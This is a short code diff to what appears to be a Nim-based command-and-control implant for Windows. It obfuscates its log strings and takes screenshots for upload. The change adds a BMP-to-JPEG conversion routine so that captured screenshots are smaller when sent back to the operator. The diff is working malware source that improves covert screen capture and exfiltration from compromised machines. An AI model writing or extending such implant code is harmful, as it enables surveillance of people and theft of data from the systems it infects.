@@ -28,10 +28,28 @@ when defined(agent):
 
     import winim/lean
     import winim/inc/wingdi
-    import strutils, strformat, times
+    import strutils, strformat, times, pixie
+    import stb_image/write as stbiw
     import ../agent/protocol/result
     import ../common/[utils, serialize]
+
+    proc bmpToJpeg(data: seq[byte], quality: int = 80): seq[byte] =
+        let img: Image = decodeImage(Bytes.toString(data))
     
+        # Convert to JPEG image for smaller file size
+        var rgbaData = newSeq[byte](img.width * img.height * 4)
+        var i = 0
+        for y in 0..<img.height:
+            for x in 0..<img.width:
+                let color = img[x, y]
+                rgbaData[i] = color.r
+                rgbaData[i + 1] = color.g
+                rgbaData[i + 2] = color.b
+                rgbaData[i + 3] = color.a
+                i += 4
+        
+        return stbiw.writeJPG(img.width, img.height, 4, rgbaData, quality)
+
     proc takeScreenshot(): seq[byte] = 
         
         var
@@ -140,8 +158,8 @@ when defined(agent):
             echo protect("    [>] Taking and uploading screenshot.")
 
             let
-                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.bmp"
-                screenshotBytes: seq[byte] = takeScreenshot() 
+                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.jpeg"
+                screenshotBytes: seq[byte] = bmpToJpeg(takeScreenshot())
 
             var packer = Packer.init() 
 
